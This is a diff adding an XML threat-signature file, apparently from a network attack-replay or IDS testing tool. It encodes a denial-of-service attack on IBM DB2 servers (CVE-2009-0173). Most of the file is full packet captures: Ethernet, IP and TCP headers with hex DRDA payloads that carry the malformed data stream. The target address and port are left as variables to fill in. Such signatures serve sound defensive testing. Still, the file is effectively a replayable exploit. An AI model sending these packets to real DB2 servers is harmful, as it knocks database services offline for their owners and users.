@@ -1,0 +1,129 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="IBM DB2 Database Server Invalid Data Stream Denial of Service"/>
+    <EngDesc display="true" value="A denial of service vulnerability exists in IBM DB2 Database Server. The flaw is due to insufficient input validation when processing malformed data streams. Remote authenticated attackers could exploit this vulnerability by sending a malicious Distributed Relational Database Architecture (DRDA) data stream to the server. In a successful attack case, the affected server will terminate and will not be available until the service is manually restarted."/>
+    <Intent display="true">
+      <item value="Denial_of_Service/Input_Validation_Error"/>
+    </Intent>
+    <Protocol display="true" value="DRDA"/>
+    <Type_Of_Equipment display="true">
+      <item value="Database_Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="IBM"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="IBM_DB2"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="IBM_DB2_prior_to_9.1_FP6a&amp;prior_to_9.5_FP3a"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2009-0173"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="63d9a4c6446d2d0e2e6e502a02394018"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633976907995893093"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1261996247" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="M"/>
+    <NamedVar name="DRDAdestPort" type="ImperfectControls.Port" value="null" index="N"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="M"/>
+      <for index="N"/>
+    </for>
+    <for index="E">
+      <for index="M"/>
+      <for index="N"/>
+    </for>
+    <for index="G">
+      <for index="N"/>
+      <for index="M"/>
+    </for>
+    <for index="I">
+      <for index="M"/>
+      <for index="N"/>
+    </for>
+    <for index="J">
+      <for index="M"/>
+      <for index="N"/>
+    </for>
+    <for index="K">
+      <for index="M"/>
+      <for index="N"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:1C:75:F5" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="013C" Identification="3ECB" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="9958" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="46030" destPort="$DRDAdestPort" SeqNumber="53B3445A" AckNumber="AFA97CCB" HeaderLength="08" WindowSize="002E" Checksum="A3ED" UrgentPointer="0000" Options="0101080A24C17A9000000000" Payload="00BED041000100B81041007F115E97A8A38896954B85A78540404040404040404040F0F1C2F4F0F3C2F8F0F0F0000000000000000000000000000000000000000000000000000000000000000060F0F0F0F1D5C1D4C54040404040404040404040404040404040404040404040404040C4C2F2E3C5E2E340F0C4C2F24040404040404040404040404000181404140300072407000914740005240F000814400008000B1147D8C4C2F261D5E30006116DE7D7000C115AE2D8D3F0F9F0F5F0004AD00100020044106D000611A2000900162110C4C2F2E3C5E2E34040404040404040404040002411DC717199A7DFD58F184596D607088DDC604FFAE6374D6A62AB0CE100ABA3D5323E" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="G" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:1C:75:F5" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="014D" Identification="3ECD" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="9945" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="46030" destPort="$DRDAdestPort" SeqNumber="53B34562" AckNumber="AFA97D46" HeaderLength="08" WindowSize="002E" Checksum="15ED" UrgentPointer="0000" Options="0101080A24C17A96000332B8" Payload="0026D04100010020106D000611A2000300162110C4C2F2E3C5E2E340404040404040404040400036D04100020030106E000611A2000300162110C4C2F2E3C5E2E34040404040404040404040000711A1A599A3000911A0C7E4C5E2E300BDD001000300B720010006210F240700212135F1F7F24BF1F64BF84BF9F34BF3F0F7F64BF0F9F0F4F0F8F2F1F1F3F1F200162110C4C2F2E3C5E2E34040404040404040404040000C112EE2D8D3F0F9F0F5F0000D002FD8E3C4E2D8D3E7F8F6001C00350006119C04E40006119D04B00006119E04E40006191304B8003C210437E2D8D3F0F9F0F5F0D5E3404040404040404040404040404040409181A581A64B85A7854040404040404040404040C7E4C5E2E3404040000005213BF1" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="J" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:1C:75:F5" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="015B" Identification="3ECE" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="9936" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="46030" destPort="$DRDAdestPort" SeqNumber="53B3467B" AckNumber="AFA97E4E" HeaderLength="08" WindowSize="0036" Checksum="E059" UrgentPointer="0000" Options="0101080A24C17B45000332BA" Payload="004ED051000200482014004421134442325445535420202020202020202020204E554C4C4944202020202020202020202020535953534832303020202020202020202020010101010101010100010035D0740002002F241400000000255345542043555252454E54204C4F43414C45204C435F4354595045203D2027656E5F555327FF004ED0510003004D200D004421134442325445535420202020202020202020204E554C4C49442020202020202020202020205359535348323030202020202020202020205359534C564C303100040056D00400040060200C004421134442325445535420202020202020202020204E554C4C49442020202020202020202020205359535348323030202020202020202020205359534C564C303100040008211400000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1,3,5">
+    <Output index="E" Count="">
+      <Ethernet srcMac="00:0C:29:1C:75:F5" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="00AF" Identification="48E0" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="4FD0" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$DRDAdestPort" destPort="46030" SeqNumber="AFA97CCB" AckNumber="53B34562" HeaderLength="08" WindowSize="F9E8" Checksum="5DD0" UrgentPointer="0000" Options="0101080A000332B824C17A90" Payload="0064D0430001005E14430024115EC4C2F240404040408482F2A2A8A28340F0C4F3F4F0F8F2C36CC6C5C46CE8F0F000181404140300072407000914740005240F000814400008000B1147D8C4C2F261D5E30007116DC4C2F2000C115AE2D8D3F0F9F0F5F00017D0030002001114AC000811A200030005000511A401" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="I" Count="">
+      <Ethernet srcMac="00:0C:29:1C:75:F5" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="013C" Identification="48E2" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="4F41" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$DRDAdestPort" destPort="46030" SeqNumber="AFA97D46" AckNumber="53B3467B" HeaderLength="08" WindowSize="F8CF" Checksum="133D" UrgentPointer="0000" Options="0101080A000332BA24C17A96" Payload="0010D0430001000A14AC000611A200030015D0420002000F1219000611490000000511A400005DD052000300572201000611490000000C112EE2D8D3F0F9F0F5F0000D002FD8E3C4E2D8D3E7F8F6001C00350006119C04B80006119D04B00006119E04B80006191304B8000621030007000621252435000C11A0C7E4C5E2E34040400086D0030003008024080000000000303030303053514C30393035300003000000FFFFFFFF0000000003000000000000000000000020202020202020202020200012444232544553542020202020202020202020002D31FF31323038FF4755455354202020FF44423254455354FF514442322F4E54FF37FF37FF30FF31323532FF31FF0000FF" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="K" Count="">
+      <Ethernet srcMac="00:0C:29:1C:75:F5" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0034" Identification="48E3" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="5048" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$DRDAdestPort" destPort="46030" SeqNumber="AFA97E4E" AckNumber="53B347A2" HeaderLength="08" WindowSize="F7A8" Checksum="0A49" UrgentPointer="0000" Options="0101080A000332BC24C17B45" Payload="" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
